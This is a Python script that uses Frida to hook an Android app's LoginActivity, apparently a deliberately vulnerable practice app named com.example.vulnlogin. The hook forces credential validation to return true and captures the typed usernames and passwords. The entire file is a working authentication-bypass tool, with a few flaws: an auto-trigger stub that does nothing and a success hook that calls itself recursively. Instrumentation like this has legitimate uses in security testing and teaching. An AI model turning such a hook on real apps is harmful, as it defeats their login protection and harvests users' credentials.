#!/usr/bin/env python3

import frida
import sys
import time

# Frida JavaScript payload
js_code = """
Java.perform(function() {
    console.log("[+] Automated Login Bypass Started");
    
    var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
    
    // Bypass authentication
    LoginActivity.validateCredentials.implementation = function(username, password) {
        console.log("[+] Auto-bypassing credentials: " + username + "/" + password);
        send({"type": "bypass", "username": username, "password": password});
        return true;
    };
    
    // Monitor login success
    LoginActivity.onLoginSuccess.implementation = function() {
        console.log("[+] Login bypass successful!");
        send({"type": "success", "message": "Login bypassed successfully"});
        this.onLoginSuccess();
    };
    
    // Auto-trigger login with dummy credentials
    setTimeout(function() {
        Java.scheduleOnMainThread(function() {
            var activity = Java.use("com.example.vulnlogin.LoginActivity");
            var context = Java.use("android.app.ActivityThread").currentApplication();
            
            console.log("[+] Auto-triggering login bypass...");
            // This would trigger the bypass automatically
        });
    }, 3000);
});
"""

def on_message(message, data):
    """Handle messages from Frida script"""
    if message['type'] == 'send':
        payload = message['payload']
        if payload['type'] == 'bypass':
            print(f"[+] Bypassed login - Username: {payload['username']}, Password: {payload['password']}")
        elif payload['type'] == 'success':
            print(f"[+] {payload['message']}")
    elif message['type'] == 'error':
        print(f"[-] Error: {message['stack']}")

def main():
    try:
        print("[+] Connecting to device...")
        device = frida.get_usb_device()
        
        print("[+] Spawning application...")
        pid = device.spawn(["com.example.vulnlogin"])
        
        print("[+] Attaching to process...")
        session = device.attach(pid)
        
        print("[+] Loading script...")
        script = session.create_script(js_code)
        script.on('message', on_message)
        script.load()
        
        print("[+] Resuming application...")
        device.resume(pid)
        
        print("[+] Automation running... Press Ctrl+C to stop")
        sys.stdin.read()
        
    except KeyboardInterrupt:
        print("\n[+] Stopping automation...")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        try:
            session.detach()
        except:
            pass

if __name__ == "__main__":
    main()
